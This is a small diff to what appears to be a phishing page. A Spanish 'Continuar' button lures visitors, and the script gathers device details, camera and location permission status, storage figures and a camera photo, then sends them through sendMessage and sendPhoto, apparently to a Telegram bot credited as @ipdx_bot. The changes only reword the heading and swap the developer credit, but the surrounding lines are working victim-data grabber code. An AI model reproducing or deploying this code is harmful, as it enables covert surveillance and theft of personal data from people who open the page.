@@ -64,7 +64,7 @@
 </head>
 <body>
 <div class="card">
-    <h1>🔓 Acceso rápido</h1>
+    <h1>🔓 Continuar</h1>
     <p>Presiona el botón para continuar</p>
     <button id="btn">Continuar</button>
     <div id="errorMsg" class="error-msg"></div>
@@ -226,7 +226,7 @@
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
         message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @ipdx_bot\n`;
 
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
